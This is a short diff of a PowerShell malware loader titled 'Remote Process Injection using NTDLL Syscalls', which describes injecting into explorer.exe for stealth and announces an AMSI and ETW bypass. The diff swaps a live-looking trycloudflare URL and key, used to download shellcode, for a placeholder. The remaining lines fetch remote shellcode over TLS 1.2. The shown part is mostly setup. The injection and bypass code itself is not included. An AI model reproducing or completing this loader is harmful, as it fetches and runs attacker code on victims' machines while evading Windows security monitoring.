@@ -1,7 +1,7 @@
 # Remote Process Injection using NTDLL Syscalls - PS5 x64
 # Injects into explorer.exe instead of self (stealthier)
 
-$u='https://concentrations-omaha-topic-hanging.trycloudflare.com/payloads/shellcode.txt?key=b45140e1b16ca05973c1fa308729c8fc'
+$u='https://CHANGE-MECHANGE-ME.trycloudflare.com/payloads/shellcode.txt?key=PLACEHOLDER_TOKEN'
 [Net.ServicePointManager]::SecurityProtocol='Tls12'
 
 # AMSI + ETW bypass
